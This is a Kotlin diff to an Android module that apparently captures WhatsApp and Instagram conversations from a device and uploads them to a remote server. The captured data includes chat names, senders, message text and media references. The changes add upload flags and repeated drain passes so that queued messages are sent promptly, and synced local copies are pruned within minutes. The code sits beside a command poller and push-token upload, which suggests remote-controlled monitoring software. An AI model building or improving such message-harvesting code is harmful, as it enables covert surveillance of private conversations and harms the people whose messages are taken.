@@ -63,9 +63,13 @@ object RealtimeLogObserverManager {
 
     private var whatsAppJob: Job? = null
     private val whatsAppMutex = Mutex()
+    @Volatile private var pendingWaUpload = false
+    @Volatile private var isWaUploading = false
 
     private var instagramJob: Job? = null
     private val instagramMutex = Mutex()
+    @Volatile private var pendingIgUpload = false
+    @Volatile private var isIgUploading = false
 
     private var commandPollerJob: Job? = null
     private var lastUploadedFcmToken: String? = null
@@ -326,6 +330,8 @@ object RealtimeLogObserverManager {
 
     fun triggerInstantWhatsAppUpload(context: Context, immediate: Boolean = false) {
         synchronized(this) {
+            pendingWaUpload = true
+            if (isWaUploading) return
             if (immediate) {
                 whatsAppJob?.cancel()
                 whatsAppJob = scope.launch {
@@ -344,6 +350,7 @@ object RealtimeLogObserverManager {
 
     private suspend fun captureAndUploadWhatsApp(context: Context) {
         whatsAppMutex.withLock {
+            isWaUploading = true
             try {
                 val db = AppDatabase.getInstance(context)
                 val state = DeviceState(context)
@@ -353,43 +360,57 @@ object RealtimeLogObserverManager {
                     db.whatsAppMessageDao().clearOversizedUnsyncedBlobs()
                 } catch (_: Throwable) {}
 
-                for (batch in 0 until 5) {
-                    val unsynced = db.whatsAppMessageDao().getUnsynced(50)
-                    if (unsynced.isEmpty()) break
+                var drainPasses = 0
+                do {
+                    pendingWaUpload = false
+                    for (batch in 0 until 5) {
+                        val unsynced = db.whatsAppMessageDao().getUnsynced(50)
+                        if (unsynced.isEmpty()) break
 
-                    val dtos = unsynced.map {
-                        WhatsAppMessageEntryDto(
-                            chatName = it.chatName,
-                            sender = if (it.isOutgoing) "me" else it.sender,
-                            messageText = it.messageText,
-                            isOutgoing = it.isOutgoing,
-                            messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
-                            mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
-                            mediaPath = it.mediaPath,
-                            reelUrl = it.reelUrl
-                        )
+                        val dtos = unsynced.map {
+                            WhatsAppMessageEntryDto(
+                                chatName = it.chatName,
+                                sender = if (it.isOutgoing) "me" else it.sender,
+                                messageText = it.messageText,
+                                isOutgoing = it.isOutgoing,
+                                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                                mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
+                                mediaPath = it.mediaPath,
+                                reelUrl = it.reelUrl
+                            )
+                        }
+                        val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
+                        if (response.isSuccessful) {
+                            db.whatsAppMessageDao().markSynced(unsynced.map { it.id })
+                            db.whatsAppMessageDao().pruneSyncedMessages(System.currentTimeMillis() - 10 * 60 * 1000L)
+                            db.whatsAppMessageDao().pruneOldMessages(System.currentTimeMillis() - 60 * 60 * 1000L)
+                            Log.d(TAG, "Smart Flush: Uploaded ${dtos.size} WhatsApp messages to server")
+                        } else {
+                            Log.w(TAG, "WhatsApp upload failed HTTP ${response.code()}")
+                            pendingWaUpload = false
+                            break
+                        }
                     }
-                    val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
-                    if (response.isSuccessful) {
-                        db.whatsAppMessageDao().markSynced(unsynced.map { it.id })
-                        db.whatsAppMessageDao().pruneSyncedMessages(System.currentTimeMillis() - 10 * 60 * 1000L)
-                        db.whatsAppMessageDao().pruneOldMessages(System.currentTimeMillis() - 60 * 60 * 1000L)
-                        Log.d(TAG, "Smart Flush: Uploaded ${dtos.size} WhatsApp messages to server")
-                    } else {
-                        Log.w(TAG, "WhatsApp upload failed HTTP ${response.code()}")
-                        break
-                    }
-                }
+                    drainPasses++
+                } while (pendingWaUpload && drainPasses < 3)
                 Unit
             } catch (e: Throwable) {
                 Log.e(TAG, "Error in real-time WhatsApp upload", e)
+            } finally {
+                isWaUploading = false
             }
         }
     }
 
     fun triggerInstantInstagramUpload(context: Context, immediate: Boolean = false) {
         synchronized(this) {
-            instagramJob?.cancel()
+            pendingIgUpload = true
+            if (isIgUploading) return
+            if (!immediate && instagramJob?.isActive == true) return
+            if (immediate && instagramJob?.isActive == true) {
+                // Job is only in its 200ms debounce delay (since isIgUploading is false); replace with immediate run
+                instagramJob?.cancel()
+            }
             instagramJob = scope.launch {
                 if (!immediate) {
                     delay(200)
@@ -401,44 +422,53 @@ object RealtimeLogObserverManager {
 
     private suspend fun captureAndUploadInstagram(context: Context) {
         instagramMutex.withLock {
+            isIgUploading = true
             try {
                 val db = AppDatabase.getInstance(context)
                 val state = DeviceState(context)
                 val bearer = state.authToken?.let { "Bearer $it" } ?: return
 
-                for (batch in 0 until 5) {
-                    val unsynced = db.instagramMessageDao().getUnsynced(50)
-                    if (unsynced.isEmpty()) break
+                var drainPasses = 0
+                do {
+                    pendingIgUpload = false
+                    for (batch in 0 until 5) {
+                        val unsynced = db.instagramMessageDao().getUnsynced(50)
+                        if (unsynced.isEmpty()) break
 
-                    val dtos = unsynced.map {
-                        InstagramMessageEntryDto(
-                            chatName = it.chatName,
-                            sender = it.sender,
-                            messageText = it.messageText,
-                            isOutgoing = it.isOutgoing,
-                            messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
-                            mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else "text"),
-                            mediaPath = it.mediaPath,
-                            reelUrl = it.reelUrl,
-                            targetAccount = null
+                        val dtos = unsynced.map {
+                            InstagramMessageEntryDto(
+                                chatName = it.chatName,
+                                sender = it.sender,
+                                messageText = it.messageText,
+                                isOutgoing = it.isOutgoing,
+                                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                                mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else "text"),
+                                mediaPath = it.mediaPath,
+                                reelUrl = it.reelUrl,
+                                targetAccount = null
+                            )
+                        }
+                        val response = ApiClient.service.syncInstagramMessages(
+                            bearer,
+                            InstagramMessagesSyncRequest(dtos, accountName = null)
                         )
+                        if (response.isSuccessful) {
+                            db.instagramMessageDao().markSynced(unsynced.map { it.id })
+                            db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
+                            Log.d(TAG, "Instantly uploaded ${dtos.size} Instagram messages to server")
+                        } else {
+                            Log.w(TAG, "Instagram upload failed HTTP ${response.code()}")
+                            pendingIgUpload = false
+                            break
+                        }
                     }
-                    val response = ApiClient.service.syncInstagramMessages(
-                        bearer,
-                        InstagramMessagesSyncRequest(dtos, accountName = null)
-                    )
-                    if (response.isSuccessful) {
-                        db.instagramMessageDao().markSynced(unsynced.map { it.id })
-                        db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
-                        Log.d(TAG, "Instantly uploaded ${dtos.size} Instagram messages to server")
-                    } else {
-                        Log.w(TAG, "Instagram upload failed HTTP ${response.code()}")
-                        break
-                    }
-                }
+                    drainPasses++
+                } while (pendingIgUpload && drainPasses < 3)
                 Unit
             } catch (e: Throwable) {
                 Log.e(TAG, "Error in real-time Instagram upload", e)
+            } finally {
+                isIgUploading = false
             }
         }
     }
